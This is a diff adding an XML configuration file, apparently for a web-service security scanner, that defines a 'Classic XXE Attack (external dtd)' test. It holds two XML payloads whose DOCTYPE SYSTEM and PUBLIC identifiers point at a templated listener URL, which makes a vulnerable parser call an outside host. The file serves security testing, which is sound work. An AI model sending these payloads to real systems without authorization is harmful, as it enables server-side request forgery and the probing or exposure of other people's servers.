@@ -1,0 +1,21 @@
+<config>
+<name>Classic XXE Attack (external dtd)</name>
+<description>The idea of this attack is to force the parser to call arbitrary URLs.</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+    <externalResources>false</externalResources>
+</params>
+<attackvectors>
+<attackvector type="system" default="true">
+<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "§tf_listenURL§">]]></directMessage>
+</attackvector>
+<attackvector type="public">
+<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data PUBLIC "p" "§tf_listenURL§">]]></directMessage>
+</attackvector>
+</attackvectors>
+</config>
